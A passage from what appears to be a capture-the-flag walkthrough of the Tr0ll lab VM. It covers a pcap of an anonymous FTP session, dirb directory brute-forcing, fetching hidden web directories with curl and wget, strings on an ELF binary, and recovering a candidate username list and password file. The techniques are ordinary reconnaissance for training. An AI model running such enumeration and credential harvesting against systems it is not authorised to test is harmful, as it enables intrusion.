+    <div>000019b0  8e f9 62 2c 08 81 80 18  03 89 39 d8 00 00 01 01  |..b,......9.....|</div>
+    <div>000019c0  08 0a 00 1a c6 7b 00 05  e3 4f 31 35 30 20 48 65  |.....{...O150 He|</div>
+    <div>000019d0  72 65 20 63 6f 6d 65 73  20 74 68 65 20 64 69 72  |re comes the dir|</div>
+    <div>000019e0  65 63 74 6f 72 79 20 6c  69 73 74 69 6e 67 2e 0d  |ectory listing..|</div>
+    <div>000019f0  0a 00 00 00 8c 00 00 00  06 00 00 00 ac 00 00 00  |................|</div>
+    <div>00001a00  00 00 00 00 41 00 05 00  c7 78 5a 8c 8c 00 00 00  |....A....xZ.....|</div>
+    <div>00001a10  8c 00 00 00 00 0c 29 5d  04 92 00 0c 29 20 70 99  |......)]....) p.|</div>
+    <div>00001a20  08 00 45 08 00 7e 90 bf  40 00 40 06 95 a1 0a 00  |..E..~..@.@.....|</div>
+    <div>00001a30  00 06 0a 00 00 0c 00 14  ac 4a 8b d0 56 c7 83 36  |.........J..V..6|</div>
+    <div>00001a40  10 20 80 18 03 91 36 df  00 00 01 01 08 0a 00 1a  |. ....6.........|</div>
+    <div>00001a50  c6 7b 00 05 e3 4f 2d 72  77 2d 72 2d 2d 72 2d 2d  |.{...O-rw-r--r--|</div>
+    <div>00001a60  20 20 20 20 31 20 30 20  20 20 20 20 20 20 20 30  |    1 0        0|</div>
+    <div>00001a70  20 20 20 20 20 20 20 20  20 20 20 20 20 31 34 37  |             147|</div>
+    <div>00001a80  20 41 75 67 20 31 30 20  30 30 3a 33 38 20 73 65  | Aug 10 00:38 <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">se</font>|</div>
+    <div>00001a90  63 72 65 74 5f 73 74 75  66 66 2e 74 78 74 0d 0a  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">cret_stuff.txt</font>..|</div>
+    <div>00001aa0  ac 00 00 00 06 00 00 00  64 00 00 00 00 00 00 00  |........d.......|</div>
+    <div>00001ab0  41 00 05 00 cb 78 5a 8c  42 00 00 00 42 00 00 00  |A....xZ.B...B...|</div>
+    <div>00001ac0  00 0c 29 20 70 99 00 0c  29 5d 04 92 08 00 45 00  |..) p...)]....E.|</div>
+    <div>00001ad0  00 34 f3 6f 40 00 40 06  33 43 0a 00 00 0c 0a 00  |.4.o@.@.3C......|</div>
+    <div>00001ae0  00 06 ac 4a 00 14 83 36  10 20 8b d0 57 11 80 10  |...J...6. ..W...|</div>
+    <div>00001af0  00 1d 96 0d 00 00 01 01  08 0a 00 05 e3 4f 00 1a  |.............O..|</div>
+    <div>00001b00  c6 7b 00 00 64 00 00 00  06 00 00 00 64 00 00 00  |.{..d.......d...|</div>
+    <div>00001b10  00 00 00 00 41 00 05 00  dc 78 5a 8c 42 00 00 00  |....A....xZ.B...|</div>
+    <div>00001b20  42 00 00 00 00 0c 29 5d  04 92 00 0c 29 20 70 99  |B.....)]....) p.|</div>
+    <div>00001b30  08 00 45 08 00 34 90 c0  40 00 40 06 95 ea 0a 00  |..E..4..@.@.....|</div>
+    <div>00001b40  00 06 0a 00 00 0c 00 14  ac 4a 8b d0 57 11 83 36  |.........J..W..6|</div>
+    <div>00001b50  10 20 80 11 03 91 92 98  00 00 01 01 08 0a 00 1a  |. ..............|</div>
+    <div>00001b60  c6 7b 00 05 e3 4f 00 00  64 00 00 00 06 00 00 00  |.{...O..d.......|</div>
+    <div>00001b70  64 00 00 00 00 00 00 00  41 00 05 00 54 79 5a 8c  |d.......A...TyZ.|</div>
+    <div>00001b80  42 00 00 00 42 00 00 00  00 0c 29 20 70 99 00 0c  |B...B.....) p...|</div>
+    <div>00001b90  29 5d 04 92 08 00 45 08  00 34 f3 70 40 00 40 06  |)]....E..4.p@.@.|</div>
+    <div>00001ba0  33 3a 0a 00 00 0c 0a 00  00 06 ac 4a 00 14 83 36  |3:.........J...6|</div>
+    <div>00001bb0  10 20 8b d0 57 12 80 11  00 1d 96 0b 00 00 01 01  |. ..W...........|</div>
+    <div>00001bc0  08 0a 00 05 e3 4f 00 1a  c6 7b 00 00 64 00 00 00  |.....O...{..d...|</div>
+    <div>00001bd0  06 00 00 00 64 00 00 00  00 00 00 00 41 00 05 00  |....d.......A...|</div>
+    <div>00001be0  8c 80 5a 8c 42 00 00 00  42 00 00 00 00 0c 29 5d  |..Z.B...B.....)]|</div>
+    <div>00001bf0  04 92 00 0c 29 20 70 99  08 00 45 08 00 34 90 c1  |....) p...E..4..|</div>
+    <div>00001c00  40 00 40 06 95 e9 0a 00  00 06 0a 00 00 0c 00 14  |@.@.............|</div>
+    <div>00001c10  ac 4a 8b d0 57 12 83 36  10 21 80 10 03 91 92 97  |.J..W..6.!......|</div>
+    <div>00001c20  00 00 01 01 08 0a 00 1a  c6 7b 00 05 e3 4f 00 00  |.........{...O..|</div>
+    <div>00001c30  64 00 00 00 06 00 00 00  7c 00 00 00 00 00 00 00  |d.......|.......|</div>
+    <div>00001c40  41 00 05 00 93 80 5a 8c  5a 00 00 00 5a 00 00 00  |A.....Z.Z...Z...|</div>
+    <div>00001c50  00 0c 29 5d 04 92 00 0c  29 20 70 99 08 00 45 00  |..)]....) p...E.|</div>
+    <div>00001c60  00 4c 3e 0f 40 00 40 06  e8 8b 0a 00 00 06 0a 00  |.L&gt;.@.@.........|</div>
+    <div>00001c70  00 0c 00 15 cc e1 9f 75  8f 20 62 2c 08 81 80 18  |.......u. b,....|</div>
+    <div>00001c80  03 89 89 64 00 00 01 01  08 0a 00 1a c6 7b 00 05  |...d.........{..|</div>
+    <div>00001c90  e3 4f 32 32 36 20 44 69  72 65 63 74 6f 72 79 20  |.O226 Directory |</div>
+    <div>00001ca0  73 65 6e 64 20 4f 4b 2e  0d 0a 00 00 7c 00 00 00  |send OK.....|...|</div>
+    <div>00001cb0  06 00 00 00 64 00 00 00  00 00 00 00 41 00 05 00  |....d.......A...|</div>
+    <div>00001cc0  b8 80 5a 8c 42 00 00 00  42 00 00 00 00 0c 29 20  |..Z.B...B.....) |</div>
+    <div>00001cd0  70 99 00 0c 29 5d 04 92  08 00 45 10 00 34 c8 28  |p...)]....E..4.(|</div>
+    <div>00001ce0  40 00 40 06 5e 7a 0a 00  00 0c 0a 00 00 06 cc e1  |@.@.^z..........|</div>
+    <div>00001cf0  00 15 62 2c 08 81 9f 75  8f 38 80 10 00 1d 52 51  |..b,...u.8....RQ|</div>
+    <div>00001d00  00 00 01 01 08 0a 00 05  e3 50 00 1a c6 7b 00 00  |.........P...{..|</div>
+    <div>00001d10  64 00 00 00 06 00 00 00  68 00 00 00 00 00 00 00  |d.......h.......|</div>
+    <div>00001d20  41 00 05 00 7e ca 89 8d  48 00 00 00 48 00 00 00  |A...~...H...H...|</div>
+    <div>00001d30  00 0c 29 20 70 99 00 0c  29 5d 04 92 08 00 45 10  |..) p...)]....E.|</div>
+    <div>00001d40  00 3a c8 29 40 00 40 06  5e 73 0a 00 00 0c 0a 00  |.:.)@.@.^s......|</div>
+    <div>00001d50  00 06 cc e1 00 15 62 2c  08 81 9f 75 8f 38 80 18  |......b,...u.8..|</div>
+    <div>00001d60  00 1d 97 26 00 00 01 01  08 0a 00 05 f6 b9 00 1a  |...&amp;............|</div>
+    <div>00001d70  c6 7b 51 55 49 54 0d 0a  68 00 00 00 06 00 00 00  |.{QUIT..h.......|</div>
+    <div>00001d80  70 00 00 00 00 00 00 00  41 00 05 00 ce cb 89 8d  |p.......A.......|</div>
+    <div>00001d90  50 00 00 00 50 00 00 00  00 0c 29 5d 04 92 00 0c  |P...P.....)]....|</div>
+    <div>00001da0  29 20 70 99 08 00 45 00  00 42 3e 10 40 00 40 06  |) p...E..B&gt;.@.@.|</div>
+    <div>00001db0  e8 94 0a 00 00 06 0a 00  00 0c 00 15 cc e1 9f 75  |...............u|</div>
+    <div>00001dc0  8f 38 62 2c 08 87 80 18  03 89 39 1e 00 00 01 01  |.8b,......9.....|</div>
+    <div>00001dd0  08 0a 00 1a d9 e5 00 05  f6 b9 32 32 31 20 47 6f  |..........221 Go|</div>
+    <div>00001de0  6f 64 62 79 65 2e 0d 0a  70 00 00 00 06 00 00 00  |odbye...p.......|</div>
+    <div>00001df0  64 00 00 00 00 00 00 00  41 00 05 00 d5 cb 89 8d  |d.......A.......|</div>
+    <div>00001e00  42 00 00 00 42 00 00 00  00 0c 29 5d 04 92 00 0c  |B...B.....)]....|</div>
+    <div>00001e10  29 20 70 99 08 00 45 00  00 34 3e 11 40 00 40 06  |) p...E..4&gt;.@.@.|</div>
+    <div>00001e20  e8 a1 0a 00 00 06 0a 00  00 0c 00 15 cc e1 9f 75  |...............u|</div>
+    <div>00001e30  8f 46 62 2c 08 87 80 11  03 89 27 fd 00 00 01 01  |.Fb,......'.....|</div>
+    <div>00001e40  08 0a 00 1a d9 e5 00 05  f6 b9 00 00 64 00 00 00  |............d...|</div>
+    <div>00001e50  06 00 00 00 64 00 00 00  00 00 00 00 41 00 05 00  |....d.......A...|</div>
+    <div>00001e60  66 cc 89 8d 42 00 00 00  42 00 00 00 00 0c 29 20  |f...B...B.....) |</div>
+    <div>00001e70  70 99 00 0c 29 5d 04 92  08 00 45 10 00 34 c8 2a  |p...)]....E..4.*|</div>
+    <div>00001e80  40 00 40 06 5e 78 0a 00  00 0c 0a 00 00 06 cc e1  |@.@.^x..........|</div>
+    <div>00001e90  00 15 62 2c 08 87 9f 75  8f 47 80 11 00 1d 2b 68  |..b,...u.G....+h|</div>
+    <div>00001ea0  00 00 01 01 08 0a 00 05  f6 b9 00 1a d9 e5 00 00  |................|</div>
+    <div>00001eb0  64 00 00 00 06 00 00 00  64 00 00 00 00 00 00 00  |d.......d.......|</div>
+    <div>00001ec0  41 00 05 00 ff cc 89 8d  42 00 00 00 42 00 00 00  |A.......B...B...|</div>
+    <div>00001ed0  00 0c 29 5d 04 92 00 0c  29 20 70 99 08 00 45 00  |..)]....) p...E.|</div>
+    <div>00001ee0  00 34 3e 12 40 00 40 06  e8 a0 0a 00 00 06 0a 00  |.4&gt;.@.@.........|</div>
+    <div>00001ef0  00 0c 00 15 cc e1 9f 75  8f 47 62 2c 08 88 80 10  |.......u.Gb,....|</div>
+    <div>00001f00  03 89 27 fc 00 00 01 01  08 0a 00 1a d9 e5 00 05  |..'.............|</div>
+    <div>00001f10  f6 b9 00 00 64 00 00 00  05 00 00 00 6c 00 00 00  |....d.......l...|</div>
+    <div>00001f20  00 00 00 00 41 00 05 00  d6 ad cf 8d 01 00 1c 00  |....A...........|</div>
+    <div>00001f30  43 6f 75 6e 74 65 72 73  20 70 72 6f 76 69 64 65  |Counters provide|</div>
+    <div>00001f40  64 20 62 79 20 64 75 6d  70 63 61 70 02 00 08 00  |d by dumpcap....|</div>
+    <div>00001f50  41 00 05 00 4d 98 ed 8a  03 00 08 00 41 00 05 00  |A...M.......A...|</div>
+    <div>00001f60  09 ad cf 8d 04 00 08 00  43 00 00 00 00 00 00 00  |........C.......|</div>
+    <div>00001f70  05 00 08 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</div>
+    <div>00001f80  6c 00 00 00                                       |l...|</div>
+    <div>00001f84</div>
+</div>
+<div><br /></div>
+<div>...we see it is a capture of a FTP session. Seems to be a transfer of a file named "secret_stuff.txt". However, we see a not so friendly message in the file as well.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# strings lol.pcap </div>
+    <div>Linux 3.12-kali1-486</div>
+    <div>Dumpcap 1.10.2 (SVN Rev 51934 from /trunk-1.10)</div>
+    <div>eth0    </div>
+    <div>host 10.0.0.6</div>
+    <div>Linux 3.12-kali1-486</div>
+    <div>220 (vsFTPd 3.0.2)</div>
+    <div>"USER anonymous</div>
+    <div>331 Please specify the password.</div>
+    <div>PASS password</div>
+    <div>230 Login successful.</div>
+    <div>SYST</div>
+    <div>215 UNIX Type: L8</div>
+    <div>PORT 10,0,0,12,173,198</div>
+    <div>200 PORT command successful. Consider using PASV.</div>
+    <div>LIST</div>
+    <div>150 Here comes the directory listing.</div>
+    <div>-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt</div>
+    <div>226 Directory send OK.</div>
+    <div>TYPE I</div>
+    <div>W200 Switching to Binary mode.</div>
+    <div>PORT 10,0,0,12,202,172</div>
+    <div>g&gt;    @</div>
+    <div>W200 PORT command successful. Consider using PASV.</div>
+    <div>RETR secret_stuff.txt</div>
+    <div>W150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).</div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">WWell, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P</font>
+    </div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Sucks, you were so close... gotta TRY HARDER!</font>
+    </div>
+    <div>W226 Transfer complete.</div>
+    <div>TYPE A</div>
+    <div>O200 Switching to ASCII mode.</div>
+    <div>{PORT 10,0,0,12,172,74</div>
+    <div>O200 PORT command successful. Consider using PASV.</div>
+    <div>{LIST</div>
+    <div>O150 Here comes the directory listing.</div>
+    <div>O-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt</div>
+    <div>O226 Directory send OK.</div>
+    <div>{QUIT</div>
+    <div>221 Goodbye.</div>
+    <div>Counters provided by dumpcap</div>
+</div>
+<div><br /></div>
+<div>Time to get back to digging into the HTTP service on TCP port 80. The default page for the service only returns a "hacker" image. The /secret/ page returns a "troll" image. Downloading and checking each with exiftool produces nothing. Running dirb with the big dictionary also doesn't give us anything useful</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# dirb http://10.183.0.218 /usr/share/dirb/wordlists/big.txt -o dirb-http-10.183.0.218.txt</div>
+    <div>
+        <div>-----------------</div>
+    </div>
+    <div>DIRB v2.22    </div>
+    <div>By The Dark Raver</div>
+    <div>-----------------</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>OUTPUT_FILE: dirb-http-10.183.0.218.txt</div>
+    <div>START_TIME: Sun May 19 22:53:38 2019</div>
+    <div>URL_BASE: http://10.183.0.218/</div>
+    <div>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>-----------------</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>GENERATED WORDS: 20458</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>---- Scanning URL: http://10.183.0.218/ ----</div>
+    <div>+ http://10.183.0.218/robots.txt (CODE:200|SIZE:31)</div>
+    <div>==&gt; DIRECTORY: http://10.183.0.218/secret/</div>
+    <div>+ http://10.183.0.218/server-status (CODE:403|SIZE:292)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>---- Entering directory: http://10.183.0.218/secret/ ----</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>-----------------</div>
+    <div>END_TIME: Sun May 19 22:55:37 2019</div>
+    <div>DOWNLOADED: 40916 - FOUND: 2</div>
+</div>
+<div><br /></div>
+<div>Reconsidering the "taunt" message in the pcap file, they did mention a "super secret directory" (sup3rs3cr3tdirlol). Let's see if that exists...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# curl http://10.183.0.218/sup3rs3cr3tdirlol/</div>
+    <div>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</div>
+    <div>&lt;html&gt;</div>
+    <div> &lt;head&gt;</div>
+    <div>  &lt;title&gt;Index of /sup3rs3cr3tdirlol&lt;/title&gt;</div>
+    <div> &lt;/head&gt;</div>
+    <div> &lt;body&gt;</div>
+    <div>&lt;h1&gt;Index of /sup3rs3cr3tdirlol&lt;/h1&gt;</div>
+    <div>  &lt;table&gt;</div>
+    <div>   &lt;tr&gt;&lt;th valign="top"&gt;&lt;img src="/icons/blank.gif" alt="[ICO]"&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=N;O=D"&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=M;O=A"&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=S;O=A"&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=D;O=A"&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;</div>
+    <div>   &lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;</div>
+    <div>&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/back.gif" alt="[PARENTDIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="/"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;</div>
+    <div>&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/unknown.gif" alt="[   ]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="roflmao"&gt;roflmao&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;2014-08-11 18:45  &lt;/td&gt;&lt;td align="right"&gt;7.1K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;</div>
+    <div>   &lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;</div>
+    <div>&lt;/table&gt;</div>
+    <div>&lt;address&gt;Apache/2.4.7 (Ubuntu) Server at 10.183.0.218 Port 80&lt;/address&gt;</div>
+    <div>&lt;/body&gt;&lt;/html&gt;</div>
+</div>
+<div><br /></div>
+<div>Looks like we have a directory listing with a single file, roflmao...</div>
+<div><br /></div>
+<div><img height="209" src="/assets/images/2019-05-20-tr0ll-1/2248CB56-2B21-41EE-B18B-0D12340C76ED.png" width="390" /><br /></div>
+<div><br /></div>
+<div>I'll download the file to see what it is.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# wget http://10.183.0.218/sup3rs3cr3tdirlol/roflmao</div>
+    <div>--2019-05-19 23:40:48--  http://10.183.0.218/sup3rs3cr3tdirlol/roflmao</div>
+    <div>Connecting to 10.183.0.218:80... connected.</div>
+    <div>HTTP request sent, awaiting response... 200 OK</div>
+    <div>Length: 7296 (7.1K)</div>
+    <div>Saving to: 'roflmao'</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>roflmao                               100%[=======================================================================&gt;]   7.12K  --.-KB/s    in 0s      </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>2019-05-19 23:40:48 (428 MB/s) - 'roflmao' saved [7296/7296]</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>root@kali:~/Walkthroughs/tr0ll# file roflmao</div>
+    <div>roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped</div>
+</div>
+<div><br /></div>
+<div>Looks like we have an ELF binary. I'm not really interested in running it on my attacking machine, so I'll try to do some digging into it to see if it might contain any clues. First, I'll run strings on it...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# strings roflmao </div>
+    <div>/lib/ld-linux.so.2</div>
+    <div>libc.so.6</div>
+    <div>_IO_stdin_used</div>
+    <div>printf</div>
+    <div>__libc_start_main</div>
+    <div>__gmon_start__</div>
+    <div>GLIBC_2.0</div>
+    <div>PTRh</div>
+    <div>[^_]</div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">Find address 0x0856BF to proceed</font>
+    </div>
+    <div>;*2$"</div>
+    <div>GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2</div>
+    <div>.symtab</div>
+    <div>.strtab</div>
+    <div>.shstrtab</div>
+    <div>.interp</div>
+    <div>.note.ABI-tag</div>
+    <div>.note.gnu.build-id</div>
+    <div>.gnu.hash</div>
+    <div>.dynsym</div>
+    <div>.dynstr</div>
+    <div>.gnu.version</div>
+    <div>.gnu.version_r</div>
+    <div>.rel.dyn</div>
+    <div>.rel.plt</div>
+    <div>.init</div>
+    <div>.text</div>
+    <div>.fini</div>
+    <div>.rodata</div>
+    <div>.eh_frame_hdr</div>
+    <div>.eh_frame</div>
+    <div>.init_array</div>
+    <div>.fini_array</div>
+    <div>.jcr</div>
+    <div>.dynamic</div>
+    <div>.got</div>
+    <div>.got.plt</div>
+    <div>.data</div>
+    <div>.bss</div>
+    <div>.comment</div>
+    <div>crtstuff.c</div>
+    <div>__JCR_LIST__</div>
+    <div>deregister_tm_clones</div>
+    <div>register_tm_clones</div>
+    <div>__do_global_dtors_aux</div>
+    <div>completed.6590</div>
+    <div>__do_global_dtors_aux_fini_array_entry</div>
+    <div>frame_dummy</div>
+    <div>__frame_dummy_init_array_entry</div>
+    <div>roflmao.c</div>
+    <div>__FRAME_END__</div>
+    <div>__JCR_END__</div>
+    <div>__init_array_end</div>
+    <div>_DYNAMIC</div>
+    <div>__init_array_start</div>
+    <div>_GLOBAL_OFFSET_TABLE_</div>
+    <div>__libc_csu_fini</div>
+    <div>_ITM_deregisterTMCloneTable</div>
+    <div>__x86.get_pc_thunk.bx</div>
+    <div>data_start</div>
+    <div>printf@@GLIBC_2.0</div>
+    <div>_edata</div>
+    <div>_fini</div>
+    <div>__data_start</div>
+    <div>__gmon_start__</div>
+    <div>__dso_handle</div>
+    <div>_IO_stdin_used</div>
+    <div>__libc_start_main@@GLIBC_2.0</div>
+    <div>__libc_csu_init</div>
+    <div>_end</div>
+    <div>_start</div>
+    <div>_fp_hw</div>
+    <div>__bss_start</div>
+    <div>main</div>
+    <div>_Jv_RegisterClasses</div>
+    <div>__TMC_END__</div>
+    <div>_ITM_registerTMCloneTable</div>
+    <div>_init</div>
+</div>
+<div><br /></div>
+<div>There's only one string that stands out as interesting, "Find address 0x0856BF to proceed"... but what does that mean. I tried to see if that was an address in the binary itself using objdump, but it didn't return anything.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# objdump -D roflmao | grep -i 856BF</div>
+</div>
+<div><br /></div>
+<div>The hex string doesn't really convert to ASCII. The decimal value of the string is 546495. I checked to see if that might be a directory on the server, but it returned nothing. I decided to see if the hex string "as is" might be another "super secret directory" on the server...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# curl http://10.183.0.218/0x0856BF/</div>
+    <div>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</div>
+    <div>&lt;html&gt;</div>
+    <div> &lt;head&gt;</div>
+    <div>  &lt;title&gt;Index of /0x0856BF&lt;/title&gt;</div>
+    <div> &lt;/head&gt;</div>
+    <div> &lt;body&gt;</div>
+    <div>&lt;h1&gt;Index of /0x0856BF&lt;/h1&gt;</div>
+    <div>  &lt;table&gt;</div>
+    <div>   &lt;tr&gt;&lt;th valign="top"&gt;&lt;img src="/icons/blank.gif" alt="[ICO]"&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=N;O=D"&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=M;O=A"&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=S;O=A"&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=D;O=A"&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;</div>
+    <div>   &lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;</div>
+    <div>&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/back.gif" alt="[PARENTDIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="/"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;</div>
+    <div>&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="good_luck/"&gt;good_luck/&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;2014-08-12 23:59  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;</div>
+    <div>&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="this_folder_contains_the_password/"&gt;this_folder_contains_the_password/&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;2014-08-12 23:58  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;</div>
+    <div>   &lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;</div>
+    <div>&lt;/table&gt;</div>
+    <div>&lt;address&gt;Apache/2.4.7 (Ubuntu) Server at 10.183.0.218 Port 80&lt;/address&gt;</div>
+    <div>&lt;/body&gt;&lt;/html&gt;</div>
+</div>
+<div><br /></div>
+<div>Sure enough! Another directory listing.</div>
+<div><br /></div>
+<div><img height="235" src="/assets/images/2019-05-20-tr0ll-1/FE989809-B5EB-4442-8DFA-335AAC07E620.png" width="511" /><br /></div>
+<div><br /></div>
+<div>Each directory contains a TXT file. In the "good_luck" folder, we have a which_one_lol.txt file. In the "this_folder_contains_the_password" folder, we have a Pass.txt file. Downloading each, we have the following:</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll/10.183.0.218/0x0856BF/good_luck# cat which_one_lol.txt </div>
+    <div>maleus</div>
+    <div>ps-aux</div>
+    <div>felux</div>
+    <div>Eagle11</div>
+    <div>genphlux &lt; -- Definitely not this one</div>
+    <div>usmc8892</div>
+    <div>blawrg</div>
+    <div>wytshadow</div>
+    <div>vis1t0r</div>
+    <div>overflow</div>
+</div>
+<div><br /></div>
+<div>And...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll/10.183.0.218/0x0856BF/this_folder_contains_the_password# cat Pass.txt </div>
+    <div>Good_job_:)</div>
+</div>
+<div><br /></div>
